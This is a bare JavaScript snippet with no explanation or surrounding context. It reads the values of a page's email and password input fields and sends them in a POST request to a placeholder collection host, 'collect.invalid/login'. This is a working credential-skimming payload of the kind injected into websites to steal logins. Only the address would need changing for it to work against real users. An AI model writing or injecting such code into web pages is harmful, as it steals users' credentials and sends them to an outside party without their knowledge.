const username = document.querySelector('input[type="email"]').value;
const password = document.querySelector('input[type="password"]').value;
fetch("https://collect.invalid/login", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({username, password}),
});
